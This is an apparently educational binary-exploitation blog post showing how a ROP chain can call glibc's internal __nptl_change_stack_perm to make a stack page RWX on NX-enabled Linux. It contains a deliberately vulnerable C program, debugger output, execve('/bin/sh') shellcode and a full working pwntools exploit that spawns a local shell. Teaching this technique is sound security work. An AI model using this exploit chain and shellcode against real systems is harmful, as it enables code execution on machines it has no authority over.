---
title: Make Stack Executable Again
date: '2025-06-11T16:00:00+05:30'
event: Blog Post
category: Concept
difficulty: Intermediate
author:
- VulnX
tags:
- pwn
- stack
- shellcode
description: Background  Suppose you have pwned a process and can execute your ROP
  chain, that seems great at first because now you can pop a shell right? But what...
---
## Background

Suppose you have pwned a process and can execute your ROP chain, that seems great at first because now you can pop a shell right? But what if:

- You don't have enough gadgets for popping a shell
- Or there is a seccomp filter
- Or your target value (maybe a flag in a CTF) is NOT in the filesystem but rather somewhere in memory.

In all these cases, ROP is not the *(complete)* solution[^fn-1].
Sometimes, you just need to have a shellcode in memory, because inarguably a shellcode is always better than a ROP chain.

But the real question is, now that every non-severely-outdated program has [`NX`](https://en.wikipedia.org/wiki/NX_bit) enabled, how do you execute a shellcode in the first place?

## mprotect

The conventional way to enable a certain set of memory protections over a page(s) of memory is to use the [`mprotect`](https://linux.die.net/man/2/mprotect) syscall. The signature of the syscall is:

```c
int mprotect(void *addr, size_t len, int prot);
```

As you can see, it requires you to have full control over 3 registers, `RDI`, `RSI` and `RDX`.

If you have control over all these registers simultaneously, then you can make any desired page RWX and load your shellcode there.

But did you know, there is an even hackier way to call `mprotect` indirectly, and this requires control of only 1 register: `RDI`.

## nptl_change_stack_perm

NPTL stands for Naitve POSIX Thread Library. It's the default standard for the implementation of POSIX threads (pthreads). You can read more about it [here on the wiki](https://en.wikipedia.org/wiki/Native_POSIX_Thread_Library).

There is a variety of NPTL family functions which aren't exposed publicly via GLIBC to invoke in a standard C program, instead these are called and managed internally. But if you do get a libc leak then you can force call any of these functions with a ROP chain.

One particularly interesting function for us is, `__nptl_change_stack_perm`. Here is how it works:
```c
int
__nptl_change_stack_perm (struct pthread *pd)
{
#if _STACK_GROWS_DOWN
  void *stack = pd->stackblock + pd->guardsize;
  size_t len = pd->stackblock_size - pd->guardsize;
#elif _STACK_GROWS_UP
  void *stack = pd->stackblock;
  size_t len = (uintptr_t) pd - pd->guardsize - (uintptr_t) pd->stackblock;
#else
# error "Define either _STACK_GROWS_DOWN or _STACK_GROWS_UP"
#endif
  if (__mprotect (stack, len, PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
    return errno;

  return 0;
}
rtld_hidden_def (__nptl_change_stack_perm)
```
{: file='dl-execstack.c' }

> Source: [https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/dl-execstack.c#L97](https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/dl-execstack.c#L97)
{: .prompt-info }

Basically, you give this function a `struct pthread *` and it will magically make the stack executable! What else do you want :D

But if you look at the definition of the `pthread` struct [here](https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/descr.h#L130), you will notice that is unimaginably large for us to fake in any realistic scenario. So you need to think clever.

By looking at the definition of `__nptl_change_stack_perm`, it is evident that only 3 fields are being accessed which are: `stackblock`, `guardsize`, `stackblock_size`. If you can fake just these 3 fields, then you can get ANY arbitrary memory to be RWX.

> Actually, since the `guardsize` field is common for calculating both, `void *stack` and `size_t len`, then you can easily include guardsize as a part of your ROP chain and adjust the other 2 fields to give mathematically valid result. This will further compress the ROP chain saving 8 more bytes ;)
{: .prompt-tip }

## Example

Consider the following vulnerable code:

```c
// compile with: gcc -o vuln vuln.c -g -fno-stack-protector
#include <stdio.h>

int main() {
  char buffer[100];
  printf("[LEAK] buffer = %p\n", (void *)buffer);
  printf("[LEAK] stdin = %p\n", (void *)stdin);
  scanf("%s", buffer);
  printf("Bye bye :)");
}
```
{: file='vuln.c' }

After that get the latest libc from an ubuntu machine

```
➜  pwn docker run -it ubuntu:latest
root@353ff9a5e147:/# ldd $(which ls)
        linux-vdso.so.1 (0x00007f3d1d312000)
        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f3d1d2b8000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3d1d0a6000)
        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f3d1d00c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f3d1d314000)
root@353ff9a5e147:/#

➜  pwn docker cp 353ff9a5e147:/lib/x86_64-linux-gnu/libc.so.6 .
Successfully copied 2.13MB to /tmp/pwn/.
```

and run [`pwninit`](https://github.com/io12/pwninit), this will automatically fetch the same libc but with debug symbols for easy debugging. I know, not the most efficient way, but it works :P

```
➜  pwn pwninit
bin: ./vuln
libc: ./libc.so.6

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.39-0ubuntu8.3_amd64.deb
unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.39-0ubuntu8.3_amd64.deb
setting ./ld-2.39.so executable
copying ./vuln to ./vuln_patched
running patchelf on ./vuln_patched
writing solve.py stub
```

Perfect. Let's start exploiting. Let's quickly first get our leaks and calculate the offset for saved return pointer

```python
io = process(exe.path)

gdb.attach(io, gdbscript=gs)

io.recvuntil(b'0x')
buffer = int(io.recvline().strip(), 16)
io.recvuntil(b'0x')
stdin = int(io.recvline().strip(), 16)
libc.address = stdin - libc.sym._IO_2_1_stdin_
log.info(f'{hex(buffer) = }')
log.info(f'{hex(libc.address) = }')
io.sendline(cyclic(200))

io.interactive()
```
{: file='solve.py' }

```
pwndbg> x/a $rsp
0x7ffdfae127a8: 0x6261616762616166
pwndbg> !cyclic -l 0x6261616762616166
120
```

Perfect. Let's also disassemble `__nptl_change_stack_perm`:
```
pwndbg> disassemble __nptl_change_stack_perm
Dump of assembler code for function __nptl_change_stack_perm:
   0x00007feeb3fe52f0 <+0>: endbr64
   0x00007feeb3fe52f4 <+4>: push   rbp
   0x00007feeb3fe52f5 <+5>: mov    rax,rdi
   0x00007feeb3fe52f8 <+8>: mov    rdi,QWORD PTR [rdi+0x6a0]
   0x00007feeb3fe52ff <+15>:  mov    edx,0x7
   0x00007feeb3fe5304 <+20>:  mov    rsi,QWORD PTR [rax+0x698]
   0x00007feeb3fe530b <+27>:  mov    rbp,rsp
   0x00007feeb3fe530e <+30>:  sub    rsi,rdi
   0x00007feeb3fe5311 <+33>:  add    rdi,QWORD PTR [rax+0x690]
   0x00007feeb3fe5318 <+40>:  call   0x7feeb4006db0
   0x00007feeb3fe531d <+45>:  pop    rbp
   0x00007feeb3fe531e <+46>:  test   eax,eax
   0x00007feeb3fe5320 <+48>:  cmovne eax,DWORD PTR [rip+0x34f79]        # 0x7feeb401a2a0
   0x00007feeb3fe5327 <+55>:  ret
End of assembler dump.
pwndbg> x/6i 0x7feeb4006db0
   0x7feeb4006db0:  endbr64
   0x7feeb4006db4:  mov    eax,0xa        # sys_mprotect
   0x7feeb4006db9:  syscall
   0x7feeb4006dbb:  cmp    rax,0xfffffffffffff001
   0x7feeb4006dc1:  jae    0x7feeb4006dc4
   0x7feeb4006dc3:  ret
```

Basically:
```
stack = rdi = [rdi+0x690] + [rdi+0x6a0]
len   = rsi = [rdi+0x698] - [rdi+0x6a0]
```

What if we fake these three fields in this way:

```
[rdi+0x690] stack
[rdi+0x698] size
[rdi+0x6a0] NULL
```

This way we will be directly calling `mprotect(stack, size, PROT_READ | PROT_WRITE | PROT_EXEC)`.

> Keep in mind that `stack` should be page aligned.
{: .prompt-info }

```python
rop = ROP(libc)
rop.call('__nptl_change_stack_perm', [0xcafebabe])
rop.raw(buffer >> 12 << 12) # page align stack leak
rop.raw(0x1000)
rop.raw(0)

io.sendline(flat({
    120: rop.chain()
}))
```
{: file='solve.py' }

```
pwndbg> telescope
00:0000│ rsp 0x7fff2f943558 —▸ 0x7fdb32ff275b (__spawnix+875) ◂— pop rdi
01:0008│     0x7fff2f943560 ◂— 0xcafebabe
02:0010│     0x7fff2f943568 —▸ 0x7fdb32f0b794 (__nptl_change_stack_perm@plt+4) ◂— jmp qword ptr [rip + 0x1da5c6]
03:0018│     0x7fff2f943570 —▸ 0x7fff2f943000 ◂— 1
04:0020│     0x7fff2f943578 ◂— 0x1000
05:0028│     0x7fff2f943580 ◂— 0
06:0030│     0x7fff2f943588 ◂— 0x1b12ce9529da8e00
07:0038│     0x7fff2f943590 ◂— 1
pwndbg> p &buffer
$3 = (char (*)[100]) 0x7fff2f9434e0
pwndbg> p/x 0x7fff2f943570-0x7fff2f9434e0
$4 = 0x90
```

```python
rop.call('__nptl_change_stack_perm', [buffer + 0x90 - 0x690])
```
{: file='solve.py' }

```
   0x7f1a1c7b4db0    endbr64 
   0x7f1a1c7b4db4    mov    eax, 0xa             EAX => 0xa
 ► 0x7f1a1c7b4db9    syscall  <SYS_mprotect>
        addr: 0x7ffd96f85000 —▸ 0x7ffd96f85530 —▸ 0x7ffd96f85660 —▸ 0x7ffd96f85740 —▸ 0x7ffd96f857c0 ◂— ...
        len: 0x1000
        prot: 7
   0x7f1a1c7b4dbb    cmp    rax, -0xfff
   0x7f1a1c7b4dc1    jae    0x7f1a1c7b4dc4              <0x7f1a1c7b4dc4>
 
   0x7f1a1c7b4dc3    ret
```

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap_prefer_relpaths on)
    0x55e66931c000     0x55e66931d000 r--p     1000      0 vuln_patched
    ...
    0x7ffd96f85000     0x7ffd96f86000 rwxp     1000      0 [stack]
    ...
```

BOOM! Stack got marked as RWX.

Now I will quickly make a dummy shellcode

```nasm
global _start

section .text

_start:
  push 59
  pop rax
  lea rdi, [rel binsh]
  xor rsi, rsi
  xor rdx, rdx
  syscall

binsh:
  db "/bin/sh", 0
```
{: file='shell.asm'}

```
➜  pwn nasm -f elf64 shell.asm
➜  pwn for i in $(objdump -M intel -D shell.o | grep "^ " | cut -f2) ; do echo -n "\\\\x$i" ; done ; echo
\x6a\x3b\x58\x48\x8d\x3d\x08\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00
```

Final solve script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
context.binary = exe
context.terminal = "kitty"

gs = '''
b * main+118
c
'''

io = process(exe.path)

# gdb.attach(io, gdbscript=gs)

io.recvuntil(b'0x')
buffer = int(io.recvline().strip(), 16)
io.recvuntil(b'0x')
stdin = int(io.recvline().strip(), 16)
libc.address = stdin - libc.sym._IO_2_1_stdin_
log.info(f'{hex(buffer) = }')
log.info(f'{hex(libc.address) = }')

shellcode = b'\x6a\x3b\x58\x48\x8d\x3d\x08\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00'

rop = ROP(libc)
rop.call('__nptl_change_stack_perm', [buffer + 0xa8 - 0x690])
rop.rax = buffer
rop.raw(libc.address + 0x2a1c8) # call rax
rop.raw(buffer >> 12 << 12) # page align stack leak
rop.raw(0x1000)
rop.raw(0)

io.sendline(flat({
    0: shellcode,
    120: rop.chain()
}))

io.interactive()
```
{: file='solve.py' }

```
➜  pwn python solve.py
[+] Starting local process '/tmp/pwn/vuln_patched': pid 20689
[*] hex(buffer) = '0x7ffd54a74c70'
[*] hex(libc.address) = '0x7f927e9e8000'
[*] Loaded 111 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
$ whoami
vulnx
$ id
uid=1000(vulnx) gid=1000(vulnx) groups=1000(vulnx),958(docker),998(wheel)
$ pwd
/tmp/pwn
```

And that was how we could make the stack RWX and execute a full blown shellcode by abusing internal GLIBC functions.

Hope you found it useful :D

---

[^fn-1]: I don't deny that you can't have some creative solutions, but that's maybe not the most elegant way.